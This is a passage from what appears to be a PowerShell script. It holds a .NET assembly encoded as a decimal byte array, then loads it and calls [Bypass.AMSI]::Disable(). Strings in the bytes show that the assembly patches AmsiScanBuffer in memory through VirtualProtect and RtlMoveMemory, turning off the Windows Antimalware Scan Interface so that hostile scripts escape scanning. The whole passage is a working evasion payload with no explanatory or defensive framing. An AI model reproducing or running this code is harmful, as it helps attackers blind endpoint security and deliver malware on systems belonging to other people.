117, 116, 101, 0, 68, 101, 98, 117, 103, 103, 97, 98, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 67, 111, 109, 86, 105, 115, 105, 98, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 84, 105, 116, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 84, 114, 97, 100, 101, 109, 97, 114, 107, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 84, 97, 114, 103, 101, 116, 70, 114, 97, 109, 101, 119, 111, 114, 107, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 70, 105, 108, 101, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 68, 101, 115, 99, 114, 105, 112, 116, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 67, 111, 109, 112, 105, 108, 97, 116, 105, 111, 110, 82, 101, 108, 97, 120, 97, 116, 105, 111, 110, 115, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 80, 114, 111, 100, 117, 99, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 112, 121, 114, 105, 103, 104, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 109, 112, 97, 110, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 82, 117, 110, 116, 105, 109, 101, 67, 111, 109, 112, 97, 116, 105, 98, 105, 108, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 66, 121, 116, 101, 0, 100, 119, 83, 105, 122, 101, 0, 115, 105, 122, 101, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 86, 101, 114, 115, 105, 111, 110, 105, 110, 103, 0, 65, 108, 108, 111, 99, 72, 71, 108, 111, 98, 97, 108, 0, 77, 97, 114, 115, 104, 97, 108, 0, 75, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108, 0, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 46, 100, 108, 108, 0, 83, 121, 115, 116, 101, 109, 0, 83, 121, 115, 116, 101, 109, 46, 82, 101, 102, 108, 101, 99, 116, 105, 111, 110, 0, 111, 112, 95, 65, 100, 100, 105, 116, 105, 111, 110, 0, 90, 101, 114, 111, 0, 46, 99, 116, 111, 114, 0, 85, 73, 110, 116, 80, 116, 114, 0, 83, 121, 115, 116, 101, 109, 46, 68, 105, 97, 103, 110, 111, 115, 116, 105, 99, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 73, 110, 116, 101, 114, 111, 112, 83, 101, 114, 118, 105, 99, 101, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 67, 111, 109, 112, 105, 108, 101, 114, 83, 101, 114, 118, 105, 99, 101, 115, 0, 68, 101, 98, 117, 103, 103, 105, 110, 103, 77, 111, 100, 101, 115, 0, 82, 117, 110, 116, 105, 109, 101, 72, 101, 108, 112, 101, 114, 115, 0, 66, 121, 112, 97, 115, 115, 0, 71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115, 0, 108, 112, 65, 100, 100, 114, 101, 115, 115, 0, 79, 98, 106, 101, 99, 116, 0, 108, 112, 102, 108, 79, 108, 100, 80, 114, 111, 116, 101, 99, 116, 0, 86, 105, 114, 116, 117, 97, 108, 80, 114, 111, 116, 101, 99, 116, 0, 102, 108, 78, 101, 119, 80, 114, 111, 116, 101, 99, 116, 0, 111, 112, 95, 69, 120, 112, 108, 105, 99, 105, 116, 0, 100, 101, 115, 116, 0, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101, 65, 114, 114, 97, 121, 0, 67, 111, 112, 121, 0, 76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 0, 82, 116, 108, 77, 111, 118, 101, 77, 101, 109, 111, 114, 121, 0, 111, 112, 95, 69, 113, 117, 97, 108, 105, 116, 121, 0, 0, 0, 0, 17, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 87, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 46, 0, 0, 29, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 0, 115, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 102, 0, 117, 0, 110, 0, 99, 0, 116, 0, 105, 0, 111, 0, 110, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 99, 0, 104, 0, 97, 0, 110, 0, 103, 0, 101, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 109, 0, 101, 0, 109, 0, 111, 0, 114, 0, 121, 0, 32, 0, 112, 0, 101, 0, 114, 0, 109, 0, 105, 0, 115, 0, 115, 0, 105, 0, 111, 0, 110, 0, 115, 0, 33, 0, 0, 77, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 112, 0, 97, 0, 116, 0, 99, 0, 104, 0, 32, 0, 104, 0, 97, 0, 115, 0, 32, 0, 98, 0, 101, 0, 101, 0, 110, 0, 32, 0, 97, 0, 112, 0, 112, 0, 108, 0, 105, 0, 101, 0, 100, 0, 46, 0, 0, 0, 0, 0, 77, 203, 161, 57, 40, 124, 239, 68, 156, 240, 131, 50, 130, 195, 248, 87, 0, 4, 32, 1, 1, 8, 3, 32, 0, 1, 5, 32, 1, 1, 17, 17, 4, 32, 1, 1, 14, 4, 32, 1, 1, 2, 7, 7, 5, 24, 24, 25, 9, 24, 2, 6, 24, 5, 0, 2, 2, 24, 24, 4, 0, 1, 1, 14, 4, 0, 1, 25, 11, 7, 0, 2, 1, 18, 97, 17, 101, 4, 0, 1, 24, 8, 8, 0, 4, 1, 29, 5, 8, 24, 8, 5, 0, 2, 24, 24, 8, 8, 183, 122, 92, 86, 25, 52, 224, 137, 3, 6, 17, 16, 5, 0, 2, 24, 24, 14, 4, 0, 1, 24, 14, 8, 0, 4, 2, 24, 25, 9, 16, 9, 6, 0, 3, 1, 24, 24, 8, 3, 0, 0, 8, 8, 1, 0, 8, 0, 0, 0, 0, 0, 30, 1, 0, 1, 0, 84, 2, 22, 87, 114, 97, 112, 78, 111, 110, 69, 120, 99, 101, 112, 116, 105, 111, 110, 84, 104, 114, 111, 119, 115, 1, 8, 1, 0, 2, 0, 0, 0, 0, 0, 15, 1, 0, 10, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 0, 0, 5, 1, 0, 0, 0, 0, 23, 1, 0, 18, 67, 111, 112, 121, 114, 105, 103, 104, 116, 32, 194, 169, 32, 32, 50, 48, 49, 56, 0, 0, 41, 1, 0, 36, 56, 99, 97, 49, 52, 99, 52, 57, 45, 54, 52, 52, 98, 45, 52, 48, 99, 102, 45, 98, 49, 99, 55, 45, 97, 53, 98, 100, 97, 101, 98, 48, 98, 50, 99, 97, 0, 0, 12, 1, 0, 7, 49, 46, 48, 46, 48, 46, 48, 0, 0, 77, 1, 0, 28, 46, 78, 69, 84, 70, 114, 97, 109, 101, 119, 111, 114, 107, 44, 86, 101, 114, 115, 105, 111, 110, 61, 118, 52, 46, 53, 46, 50, 1, 0, 84, 14, 20, 70, 114, 97, 109, 101, 119, 111, 114, 107, 68, 105, 115, 112, 108, 97, 121, 78, 97, 109, 101, 20, 46, 78, 69, 84, 32, 70, 114, 97, 109, 101, 119, 111, 114, 107, 32, 52, 46, 53, 46, 50, 4, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 221, 193, 71, 222, 0, 0, 0, 0, 2, 0, 0, 0, 101, 0, 0, 0, 12, 44, 0, 0, 12, 14, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 83, 68, 83, 105, 207, 113, 241, 18, 122, 72, 71, 173, 244, 95, 170, 153, 86, 158, 210, 1, 0, 0, 0, 67, 58, 92, 85, 115, 101, 114, 115, 92, 97, 110, 100, 114, 101, 92, 115, 111, 117, 114, 99, 101, 92, 114, 101, 112, 111, 115, 92, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 92, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 92, 111, 98, 106, 92, 82, 101, 108, 101, 97, 115, 101, 92, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 46, 112, 100, 98, 0, 153, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 179, 44, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 165, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 95, 67, 111, 114, 68, 108, 108, 77, 97, 105, 110, 0, 109, 115, 99, 111, 114, 101, 101, 46, 100, 108, 108, 0, 0, 0, 0, 0, 0, 0, 0, 255, 37, 0, 32, 0, 16, 49, 255, 144, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 16, 0, 0, 0, 24, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 48, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 72, 0, 0, 0, 88, 64, 0, 0, 44, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 44, 3, 52, 0, 0, 0, 86, 0, 83, 0, 95, 0, 86, 0, 69, 0, 82, 0, 83, 0, 73, 0, 79, 0, 78, 0, 95, 0, 73, 0, 78, 0, 70, 0, 79, 0, 0, 0, 0, 0, 189, 4, 239, 254, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 63, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 0, 0, 0, 1, 0, 86, 0, 97, 0, 114, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 0, 0, 36, 0, 4, 0, 0, 0, 84, 0, 114, 0, 97, 0, 110, 0, 115, 0, 108, 0, 97, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 0, 0, 176, 4, 140, 2, 0, 0, 1, 0, 83, 0, 116, 0, 114, 0, 105, 0, 110, 0, 103, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 104, 2, 0, 0, 1, 0, 48, 0, 48, 0, 48, 0, 48, 0, 48, 0, 52, 0, 98, 0, 48, 0, 0, 0, 26, 0, 1, 0, 1, 0, 67, 0, 111, 0, 109, 0, 109, 0, 101, 0, 110, 0, 116, 0, 115, 0, 0, 0, 0, 0, 0, 0, 34, 0, 1, 0, 1, 0, 67, 0, 111, 0, 109, 0, 112, 0, 97, 0, 110, 0, 121, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 62, 0, 11, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 68, 0, 101, 0, 115, 0, 99, 0, 114, 0, 105, 0, 112, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 65, 0, 77, 0, 83, 0, 73, 0, 0, 0, 0, 0, 48, 0, 8, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 62, 0, 15, 0, 1, 0, 73, 0, 110, 0, 116, 0, 101, 0, 114, 0, 110, 0, 97, 0, 108, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 65, 0, 77, 0, 83, 0, 73, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 72, 0, 18, 0, 1, 0, 76, 0, 101, 0, 103, 0, 97, 0, 108, 0, 67, 0, 111, 0, 112, 0, 121, 0, 114, 0, 105, 0, 103, 0, 104, 0, 116, 0, 0, 0, 67, 0, 111, 0, 112, 0, 121, 0, 114, 0, 105, 0, 103, 0, 104, 0, 116, 0, 32, 0, 169, 0, 32, 0, 32, 0, 50, 0, 48, 0, 49, 0, 56, 0, 0, 0, 42, 0, 1, 0, 1, 0, 76, 0, 101, 0, 103, 0, 97, 0, 108, 0, 84, 0, 114, 0, 97, 0, 100, 0, 101, 0, 109, 0, 97, 0, 114, 0, 107, 0, 115, 0, 0, 0, 0, 0, 0, 0, 0, 0, 70, 0, 15, 0, 1, 0, 79, 0, 114, 0, 105, 0, 103, 0, 105, 0, 110, 0, 97, 0, 108, 0, 70, 0, 105, 0, 108, 0, 101, 0, 110, 0, 97, 0, 109, 0, 101, 0, 0, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 65, 0, 77, 0, 83, 0, 73, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 54, 0, 11, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 65, 0, 77, 0, 83, 0, 73, 0, 0, 0, 0, 0, 52, 0, 8, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 56, 0, 8, 0, 1, 0, 65, 0, 115, 0, 115, 0, 101, 0, 109, 0, 98, 0, 108, 0, 121, 0, 32, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 12, 0, 0, 0, 200, 60, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)) | Out-Null }
[Bypass.AMSI]::Disable();}
